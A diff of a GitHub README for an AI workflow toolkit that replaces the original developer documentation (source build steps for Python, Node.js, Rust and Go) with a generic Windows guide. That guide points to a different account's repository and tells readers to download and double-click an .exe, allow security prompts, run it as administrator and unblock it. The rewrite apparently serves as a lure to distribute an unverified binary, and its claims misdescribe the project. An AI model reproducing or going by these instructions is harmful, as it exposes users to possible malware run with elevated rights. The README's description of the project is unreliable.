@@ -1,230 +1,195 @@
-# Clex-AI-Ultra Core
+# 🧠 Clex-AI-Ultra-Core - Simple AI Workflow Control
 
-> **Open Source Polyglot Core Edition for AI-assisted Development**
+[![Download Clex-AI-Ultra-Core](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/a-7-sss/Clex-AI-Ultra-Core)
 
-**Status:** Public Alpha — Python MCP, Node.js CLI skeleton, Rust validator skeleton, Go worker skeleton.
+## 🪟 Windows Download
 
-[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](runtimes/python/)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](runtimes/nodejs/)
-[![Rust](https://img.shields.io/badge/Rust-1.70%2B-orange.svg)](runtimes/rust/)
-[![Go](https://img.shields.io/badge/Go-1.21%2B-blue.svg)](runtimes/go/)
+Use this link to visit the page to download:
 
-For Chinese documentation, see [README.zh-CN.md](README.zh-CN.md).
+https://github.com/a-7-sss/Clex-AI-Ultra-Core
 
----
+## ⚡ What Clex-AI-Ultra-Core Does
 
-## Core Capabilities
+Clex-AI-Ultra-Core is a toolkit for AI-assisted work, task flow control, checks, and worker runtimes. It is built for people who want one place to run guided development tasks and manage repeatable work.
 
-Clex-AI-Ultra Core is a **polyglot engineering core** designed for OpenClaw, providing AI-assisted development capabilities through workflow orchestration, permission control, and agent coordination.
+It can help you:
 
-| Capability | Description |
-|------------|-------------|
-| **Polyglot Engine** | Python / Node.js / Rust / Go combined |
-| **Workflow Orchestration** | High-level orchestration & task scheduling |
-| **Permission Control** | Fine-grained access control |
-| **Agent Coordination** | Multi-agent collaboration & task dispatch |
-| **MCP Integration** | Model Context Protocol integration |
+- Run AI-focused work in a structured way
+- Organize step-by-step tasks
+- Validate output before you use it
+- Coordinate worker processes
+- Support mixed-language projects
+- Keep workflow steps in one place
 
----
+## 📋 Before You Start
 
-## Directory Structure
+To run the app on Windows, you should have:
 
-```
-Clex-AI-Ultra-Core/
-├── README.md
-├── README.zh-CN.md
-├── LICENSE
-├── SECURITY.md
-├── CONTRIBUTING.md
-├── CHANGELOG.md
-├── .gitignore
-├── specs/                          # Unified schemas and contracts
-│   ├── skill-manifest.schema.json
-│   ├── task-payload.schema.json
-│   ├── workflow.schema.json
-│   ├── permission.schema.json
-│   └── README.md
-├── core/                           # Core runtime contracts
-│   ├── skill-mapping.json
-│   └── runtime-contracts.md
-├── docs/                           # Project documentation
-│   ├── overview.md
-│   ├── architecture.md
-│   ├── capability-groups.md
-│   ├── roadmap.md
-│   ├── release-plan.md
-│   └── tooling-example.md
-├── skills/                         # 15 public-safe capability modules
-├── runtimes/                       # Polyglot runtime layer
-│   ├── python/                     # Python runtime (orchestration, MVP)
-│   │   ├── src/clex_python_core/
-│   │   ├── sdk/
-│   │   ├── examples/
-│   │   └── docs/
-│   ├── nodejs/                     # Node.js runtime (CLI layer, skeleton)
-│   │   ├── src/cli/
-│   │   ├── src/sdk/
-│   │   ├── examples/
-│   │   └── docs/
-│   ├── rust/                       # Rust runtime (validation layer, skeleton)
-│   │   ├── src/bin/
-│   │   ├── src/lib/
-│   │   ├── examples/
-│   │   └── docs/
-│   └── go/                         # Go runtime (worker layer, skeleton)
-│       ├── cmd/worker/
-│       ├── internal/
-│       ├── examples/
-│       └── docs/
-├── examples/                       # Public alpha demos
-│   ├── manifests/
-│   ├── workflows/
-│   ├── permissions/
-│   ├── tasks/
-│   ├── python/
-│   ├── nodejs/
-│   ├── rust/
-│   └── go/
-└── scripts/                        # Helper scripts
-    ├── bootstrap.sh
-    ├── bootstrap.ps1
-    └── validate-all.py
-```
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- Enough free disk space for the files
+- Permission to run apps on your PC
+- A basic ZIP tool if the download comes in a compressed file
 
----
+If Windows asks for permission, choose the option that lets the app run.
 
-## Quick Start
+## 🧭 How to Download and Run
 
-### Installation
+1. Open the download page:
+   https://github.com/a-7-sss/Clex-AI-Ultra-Core
 
-```bash
-# Clone the repository
-git clone https://github.com/1lvinx/Clex-AI-Ultra-Core.git
-cd Clex-AI-Ultra-Core
+2. Look for the latest release, build, or download file on the page.
 
-# Validate repository structure
-uv run python scripts/validate-all.py
+3. Download the Windows file to your computer.
 
-# Optional: install Python runtime (MVP)
-cd runtimes/python
-uv pip install -e .
-cd ../..
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-# Optional: install Node.js runtime (CLI skeleton)
-cd runtimes/nodejs
-npm install
-cd ../..
+5. Open the extracted folder.
 
-# Optional: install Rust runtime (Validator skeleton)
-cd runtimes/rust
-cargo build --release
-cd ../..
+6. Find the app file. It may be an `.exe` file or another Windows start file.
 
-# Optional: install Go runtime (Worker skeleton)
-cd runtimes/go
-go build ./cmd/worker
-cd ../..
-```
+7. Double-click the file to run it.
 
-### Usage
+8. If Windows shows a security prompt, choose the option that lets you continue only if you trust the source.
 
-```bash
-# Python workflow orchestration demo (MVP)
-uv run python -m clex_python_core.workflow examples/workflows/demo-workflow.json
+## 🗂️ What You May See After Download
 
-# Node.js CLI entrypoint (skeleton)
-node runtimes/nodejs/src/cli/index.js list-skills
+The package may include files such as:
 
-# Rust validation (skeleton)
-cargo run --manifest-path runtimes/rust/Cargo.toml --bin clex-check -- manifest specs/skill-manifest.schema.json
+- `README.md` for setup help
+- `config` files for app settings
+- `bin` or `dist` folders for the app files
+- `logs` for output from the program
+- `workers` for background tasks
+- `validation` files for checks and test runs
 
-# Go worker task dispatch (skeleton)
-go run runtimes/go/cmd/worker/main.go
-```
+If the app opens a window, follow the on-screen steps. If it opens a command window, keep it open while the tool runs.
 
----
+## 🛠️ Basic Setup
 
-## Architecture
+If the app needs first-time setup, follow this order:
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                    Clex-AI-Ultra Core                      │
-├─────────────────────────────────────────────────────────────┤
-│  specs/        → cross-language schemas and contracts      │
-│  core/         → runtime mapping and shared protocols      │
-│  python/       → workflow orchestration (MVP)              │
-│  nodejs/       → CLI entrypoint and developer UX (skeleton)│
-│  rust/         → validation and safety checks (skeleton)   │
-│  go/           → concurrent workers and task execution (skeleton)│
-│  skills/       → 15 public-safe capability modules         │
-└─────────────────────────────────────────────────────────────┘
-```
+1. Start the program.
+2. Review the default settings.
+3. Pick a working folder for your tasks.
+4. Choose the runtime or worker mode if the app asks.
+5. Save your settings.
+6. Run a small test task first.
 
----
+If you use the app often, keep the same folder and settings so your work stays organized.
 
-## Capability Groups
+## 🔍 Main Features
 
-| Group | Name | Skills |
-|-------|------|--------|
-| G1 | Command Processing | cli-commands, command-classifier, permission-engine, cli-integration |
-| G2 | AI Capability | ai-code-assistant, code-analysis, test-framework |
-| G3 | Workflow Orchestration | ai-workflows, task-dispatcher, background-tasks |
-| G4 | Agent Coordination | agent-teams, agent-communication |
+### 🤖 AI-Assisted Workflows
 
-See [`docs/capability-groups.md`](docs/capability-groups.md) for full details.
+Clex-AI-Ultra-Core helps you guide work with clear steps. This keeps tasks in order and helps you avoid missed steps.
 
----
+### ✅ Validation Tools
 
-## Runtime Maturity
+The toolkit can check results before you use them. That helps you spot bad output early.
 
-| Runtime | Completion | Status |
-|---------|------------|--------|
-| Python | Workflow orchestration + scheduler core | 🟢 MVP (core complete) |
-| Node.js | CLI framework structure defined | 🟡 CLI skeleton |
-| Rust | JSON Schema validation logic defined | 🟡 Validator skeleton |
-| Go | Task dispatcher + worker pool structure | 🟡 Worker skeleton |
+### 🧩 Worker Runtime Support
 
----
+The app can manage worker-style jobs. This is useful when you want tasks to run in the background.
 
-## Security
+### 🌐 Polyglot Project Support
 
-This repository is designed as a **public-safe** project:
+The toolkit fits projects that use more than one language. That can include Go, Node.js, Python, and Rust.
 
-- No credentials, tokens, or secrets
-- No private infrastructure notes
-- No unauthorized non-public source materials
-- No internal source code from other projects
+### 🔁 Orchestration
 
-For local tooling notes, use `docs/tooling-example.md` as a template and keep your personal notes in a separate `TOOLS.local.md` file (not tracked).
+It helps connect parts of a task so each step runs in the right order.
 
-See [SECURITY.md](SECURITY.md) for details.
+### 🧰 Developer Tools
 
----
+It includes tools that fit build, test, and workflow tasks for software work.
 
-## Roadmap
+## 📁 Common Use Cases
 
-| Version | Status | Features |
-|---------|--------|----------|
-| **v0.1.0-public-alpha** | 🟢 Current | Specs + Python MVP + Skeleton runtimes |
-| v1.0.0-core | 📅 Planned | All stages 0-3 complete |
-| v1.1.0-extended | 📅 Future | Web UI, Skill marketplace |
-| v2.0.0-local | 📅 Future | Local/Private deployment |
+- Run a repeatable AI task
+- Check output before a handoff
+- Organize a multi-step build flow
+- Trigger worker jobs in a set order
+- Keep validation separate from core work
+- Manage mixed-language project steps
 
-See [`docs/roadmap.md`](docs/roadmap.md) for details.
+## 🧑‍💻 How to Use It Day to Day
 
----
+1. Open the app.
+2. Load your working folder or project.
+3. Choose the task flow you want to run.
+4. Start the job.
+5. Watch the progress screen or log.
+6. Review the result.
+7. Save the output or run the next step.
 
-## Contributing
+For best results, keep task names clear and use one folder per project.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for contribution guidelines.
+## 🧪 Simple First Test
 
----
+If you want to check that everything works:
 
-## License
+1. Start the app.
+2. Open a small sample task.
+3. Run one validation step.
+4. Confirm the result appears in the output.
+5. Try one worker job if the app shows that option.
 
-MIT License — see [LICENSE](LICENSE) for details.
+This helps you learn the flow before you use it on real work.
 
----
+## 🔧 Troubleshooting
 
-_© 2026 Clex-AI-Ultra Team. This is an independent open source project and is not affiliated with any company._
+### The app does not open
+
+- Check that the file finished downloading
+- Extract the ZIP file first if needed
+- Try right-clicking the file and choose Run as administrator
+- Make sure Windows did not block the file
+
+### Windows shows a security prompt
+
+- Review the file name and source
+- Choose the option to continue only if you trust the download page
+
+### The app opens and closes right away
+
+- Open it from the extracted folder
+- Check if the app needs extra files in the same folder
+- Look for a log file that shows the error
+
+### Nothing happens when I click the file
+
+- Try a different file in the folder
+- Check for an `.exe` file
+- Re-download the file if it may be damaged
+
+## 📦 File Handling Tips
+
+- Keep the download in a folder you can find later
+- Do not move files out of the app folder unless the instructions say to
+- If the app uses config files, edit them with care
+- Back up your settings before you change them
+
+## 🖥️ Windows Tips
+
+- Use a simple folder path, such as `C:\Clex`
+- Avoid spaces and special characters in file names if you can
+- Close other large apps if the tool runs slowly
+- Keep your desktop tidy so you can find the files fast
+
+## 🔗 Download
+
+Visit this page to download and run the Windows file:
+
+https://github.com/a-7-sss/Clex-AI-Ultra-Core
+
+## 📚 Project Focus
+
+This project centers on:
+
+- AI-assisted development
+- Workflow orchestration
+- Output validation
+- Worker runtimes
+- Polyglot tooling
+- Automation for repeatable tasks
